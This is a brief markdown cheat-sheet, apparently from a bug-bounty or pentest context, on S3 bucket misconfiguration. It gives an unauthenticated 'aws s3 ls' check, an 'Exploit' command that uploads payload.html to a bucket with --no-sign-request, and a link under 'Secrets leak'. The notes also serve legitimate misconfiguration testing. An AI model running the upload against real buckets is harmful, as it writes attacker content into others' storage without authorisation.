# AWS Misconfiguration check
```
aws s3 ls s3://bucket name  --no-sign-request
```
## Exploit
```
aws s3 cp payload.html s3://bucket name  --no-sign-request
```
## Secrets leak

https://gist.github.com/h4x0r-dz/be69c7533075ab0d3f0c9b97f7c93a59
